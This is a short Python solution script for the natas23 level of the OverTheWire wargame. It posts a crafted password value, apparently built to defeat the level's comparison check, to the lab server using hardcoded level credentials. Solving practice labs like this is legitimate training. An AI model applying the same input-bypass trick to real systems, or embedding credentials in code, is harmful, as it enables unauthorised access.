import requests as req

username = "natas23"
password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
url = "http://natas23.natas.labs.overthewire.org/"

session = req.Session()

response = session.post(url, data={"passwd": '12iloveyousomuch'}, auth=(username, password))
print(response.text)